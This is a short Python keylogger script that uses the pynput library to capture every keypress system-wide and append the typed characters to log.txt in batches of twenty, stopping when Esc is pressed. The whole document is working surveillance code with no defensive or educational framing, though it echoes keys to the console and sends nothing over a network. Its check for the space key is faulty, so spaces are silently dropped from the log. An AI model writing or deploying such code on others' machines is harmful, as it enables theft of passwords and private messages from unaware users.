from pynput.keyboard import Key, Listener
import time

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} is being printed".format(key))
    if count >= 20:
        count = 0
        write_file()
        keys = []


def write_file():
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("Key.space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
        f.write("\n")


def on_release(key):
    if key == Key.esc:
        return False

def del_txt():
    with open("log.txt", "r+") as file:
        file.truncate(0)

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
